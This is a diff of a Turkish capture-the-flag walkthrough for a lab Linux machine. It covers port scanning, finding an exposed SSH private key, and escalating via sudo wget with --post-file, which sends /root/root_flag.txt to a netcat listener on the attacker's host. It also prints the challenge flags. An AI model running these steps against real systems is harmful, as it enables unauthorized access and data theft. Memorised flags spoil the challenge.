@@ -1,4 +1,5 @@
--nmap -sC -sV ip 
+Nmap kullanarak tarama başlatıyorum
+->nmap -sC -sV ip 
 
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
@@ -12,23 +13,43 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 
--gobuster dir -u ip -w wordlist txt 
+->gobuster dir -u ip -w wordlist txt 
 
-/.ssh
+Gobuster ile bu taramayı yapınca http://ip/sitemap/.ssh/id_rsa rsa private key buldum
 
+id_rsa2'nin içine  private key kaydettim
+->nano id_rsa
 
--nano id_rsa2
+id_rsa2 okuma ve yazma izni verdim 
 
--chmod 600 id_rsa2
+->chmod 600 id_rsa2
 
--ssh -i id_rsa2 jessie@ip
+ssh 
+->ssh -i id_rsa2 jessie@ip
+"-ssh" parametresi, SSH protokolünü kullanarak bağlantı kurmayı belirtir.
+"-i id_rsa2" parametresi, özel anahtarın yerini belirtir. Bu, kimlik doğrulaması yapmak için kullanılacak bir anahtar.
+"jessie" kullanıcı adı, uzak sunucudaki kullanıcı hesabını belirtir.
+"ip" IP adresi veya alan adı, bağlanılacak uzak sunucunun adresini belirtir
 
--cat user.txt
+Bayrağın nerde olduğunu aratıyorum
+->find | grep flag
+/Documents/user_flag.txt
+
+->cat user.txt
 057c67131c3d5e42dd5cd3075b198ff6
 
--nc -lvnp 4545
+Hangi işlemleri yapabileceğimize bakıyorum
+->sudo -l 
+user/bin/wget
 
--sudo /usr/bin/wget --post-file=/root/root_flag.txt ip  
+dinlemeyi başlatıyorum
+->nc -lvnp 4545
 
--cat flag.txt
+Bu komut, "/root/root_flag.txt" dosyasını bir HTTP POST isteği olarak belirtilen IP adresindeki sunucuya gönderir
+
+wget --post-file=$LFILE $URL
+
+->sudo /usr/bin/wget --post-file=/root/root_flag.txt ip:4545  
+
+flag.txt
 b1b968b37519ad1daa6408188649263d
